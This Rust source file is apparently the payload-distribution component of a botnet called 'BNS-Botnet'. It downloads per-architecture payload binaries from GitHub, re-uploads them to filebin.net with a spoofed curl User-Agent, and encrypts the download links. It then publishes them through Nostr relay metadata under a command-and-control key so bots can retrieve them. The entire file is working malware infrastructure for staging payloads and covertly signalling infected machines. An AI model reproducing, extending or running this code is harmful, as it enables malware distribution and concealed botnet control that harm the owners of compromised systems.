use std::collections::HashMap;
use std::fs::File;
use std::io::Write;
use std::process::exit;
use std::time::Duration;

use bns_lib::FILE_STORAGE_SERVER;
use bytes::Bytes;
use nostr_sdk::Client;
use nostr_sdk::prelude::*;
use reqwest::Client as RClient;
use reqwest::StatusCode;
use reqwest::header::CONTENT_TYPE;
use reqwest::header::HeaderMap;
use reqwest::header::HeaderValue;

mod response;

const ARCHS: [&'static str; 2] = ["aarch64", "x86_64"];
const REPO: &'static str = "https://github.com/SenneW-2158088/BNS-Botnet/releases/download/main";
const PAYLOAD: &'static str = "payload";

// Filedump constants
const FILEDUMP: &'static str = "https://filebin.net";

const RELAYS: [&str; 1] = [bns_lib::RELAY];

async fn generate_bin() -> String {
    rand::distributions::DistString::sample_string(
        &rand::distributions::Alphanumeric,
        &mut rand::thread_rng(),
        8,
    )
}

async fn upload_payload(
    client: &RClient,
    architecture: &str,
    data: Bytes,
) -> Result<response::FilebinResponse, ()> {
    // let bin = generate_bin().await;
    let bin = "im76vQIa";

    let mut headers = HeaderMap::new();
    headers.insert("accept", HeaderValue::from_static("application/json"));
    headers.insert("cid", HeaderValue::from_static("botnetclient2")); // Id isn't important i guess
    headers.insert("User-Agent", HeaderValue::from_static("curl/7.68.0")); // Set User-Agent to mimic curl
    headers.insert(
        CONTENT_TYPE,
        HeaderValue::from_static("application/octet-stream"),
    );

    let filename = format!("payload-{}", architecture);
    let url = format!("{}/{}/{}", FILEDUMP, bin, filename);

    println!("[+] Creating file dump link {}", url);

    // Upload file
    let response = client
        .post(url)
        .headers(headers)
        .body(data)
        .send()
        .await
        .map_err(|e| {
            println!("[-] Error uploading payload: {:?}", e);
            ()
        })?;
    println!("[+] Respononse: {:?}", response);
    let response_json = response
        .json::<response::FilebinResponse>()
        .await
        .map_err(|e| {
            println!("[-] Error getting json: {:?}", e);
            ()
        })?;

    // lock bin (we upload to the same bin)
    // let url = format!("{}/{}", FILEDUMP, bin);
    // println!("Locking bin {}", url);
    // let _ = client.put(url).send().await.map_err(|_| ())?;

    Ok(response_json)
}

async fn download_payload(client: &RClient, architecture: &str) -> Result<Bytes, ()> {
    let url = format!("{}/{}-{}", REPO, PAYLOAD, architecture);
    println!("[i] Downloading payload from {}", url);
    let response = client.get(url).send().await.map_err(|e| ())?;
    if response.status() != StatusCode::OK {
        return Err(());
    }
    let payload = response.bytes().await.map_err(|e| ())?;

    Ok(payload)
}

async fn run() -> Result<()> {
    let client = RClient::builder()
        .redirect(reqwest::redirect::Policy::limited(10))
        .build()
        .unwrap();

    let mut payloads: HashMap<String, Bytes> = HashMap::new();

    println!("[i] Downloading payloads from github");
    for architecture in ARCHS {
        match download_payload(&client, architecture).await {
            Ok(payload) => {
                println!("[+] Downloaded payload for {}", architecture);
                payloads.insert(architecture.to_string(), payload);
            }
            Err(_) => println!("[-] Error getting payload for {}", architecture),
        }
    }

    if payloads.len() == 0 {
        println!("[i] No payloads, stopping...");
        exit(-1);
    }

    println!("[i] Publishing payloads on filebin");

    // Map of architecture -> url
    let mut filebin_urls: HashMap<String, String> = HashMap::new();

    for (architecture, payload) in payloads {
        match upload_payload(&client, architecture.as_str(), payload).await {
            Ok(response) => {
                let link = format!(
                    "{}/{}/{}",
                    FILEDUMP, response.bin.id, response.file.filename
                );
                filebin_urls.insert(architecture, link.clone());
                println!("[+] Created file dump link {}", link);
            }
            Err(e) => println!(
                "[-] Error uploading to filedump for architecture {}: {:?}",
                architecture, e
            ),
        }
    }

    if filebin_urls.len() == 0 {
        println!("[i] No filebin urls, stopping...");
        exit(-1);
    }

    let serialized = serde_json::to_string(&filebin_urls).unwrap();
    println!("[+] Created serialized table");
    println!("{:?}", serialized);

    let encrypted = bns_lib::encryption::encrypt(&serialized, bns_lib::ENCRYPTION_KEY)
        .expect("failed to encrypt payload");

    let keys: Keys = Keys::parse(bns_lib::CNC_PRIVATE_KEY)?;

    let connection: Connection = Connection::new();
    let opts = Options::new().connection(connection);
    let client = Client::builder().signer(keys.clone()).opts(opts).build();

    println!("[i] Connecting to nostr");
    client
        .add_relay(bns_lib::RELAY)
        .await
        .expect("failed to add relay");

    client
        .connect_relay(bns_lib::RELAY)
        .await
        .expect("failed to connect to relay");

    let fetched = client
        .fetch_metadata(
            PublicKey::parse(bns_lib::CNC_PUB_KEY).unwrap(),
            Duration::from_secs(2),
        )
        .await;

    let metadata = match fetched {
        Ok(metadata) => metadata.custom_field("payload", encrypted),
        Err(_) => Metadata::new().custom_field("payload", encrypted),
    };

    println!("[+] uploading data...");
    let _ = client.set_metadata(&metadata).await;
    let builder = EventBuilder::text_note("Hey check out my new payload :)");
    client.send_event_builder(builder).await.unwrap();

    client.disconnect().await;

    Ok(())
}

#[tokio::main]
async fn main() {
    match run().await {
        Err(e) => {
            println!("Got an error {}", e.to_string())
        }
        _ => println!("Succeeded"),
    }
}
